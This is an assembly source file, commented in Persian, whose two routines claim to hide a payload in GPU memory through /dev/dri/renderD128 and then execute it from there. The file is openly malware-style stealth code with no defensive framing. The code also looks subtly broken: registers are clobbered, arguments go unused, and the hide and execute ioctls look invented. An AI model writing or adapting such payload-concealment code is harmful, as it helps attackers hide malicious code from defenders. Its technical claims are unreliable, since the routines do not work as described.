section .text
global hide_in_gpu_memory, gpu_execute_payload

%include "gpu_memory.inc"

hide_in_gpu_memory:
    ; RDI = آدرس پیلود
    ; RSI = اندازه پیلود
    
    ; باز کردن دستگاه GPU
    mov rax, SYS_open
    mov rdi, gpu_device
    mov rsi, O_RDWR
    syscall
    mov [gpu_fd], rax
    
    ; تخصیص حافظه GPU
    mov rdi, rax
    mov rsi, GPU_MEM_ALLOC
    mov rdx, rsi
    mov r10, GPU_MEM_FLAGS
    mov rax, SYS_ioctl
    syscall
    mov [gpu_mem_handle], rax
    
    ; نگاشت حافظه GPU به فضای کاربر
    mov rdi, 0
    mov rsi, rsi
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED
    mov r8, [gpu_fd]
    mov r9, [gpu_mem_handle]
    mov rax, SYS_mmap
    syscall
    mov [gpu_mapped_addr], rax
    
    ; کپی پیلود به حافظه GPU
    mov rdi, rax
    mov rsi, [payload]
    mov rdx, [payload_size]
    call memcpy
    
    ; پنهان‌سازی با تغییر نوع حافظه
    mov rdi, [gpu_fd]
    mov rsi, GPU_MEM_HIDE
    mov rdx, [gpu_mem_handle]
    mov rax, SYS_ioctl
    syscall
    
    ret

gpu_execute_payload:
    ; اجرای پیلود از طریق GPU
    mov rdi, [gpu_fd]
    mov rsi, GPU_EXEC_CMD
    mov rdx, gpu_exec_params
    mov rax, SYS_ioctl
    syscall
    ret

section .data
gpu_device      db "/dev/dri/renderD128",0
gpu_exec_params dd GPU_EXEC_ADDR, GPU_EXEC_SIZE, 0
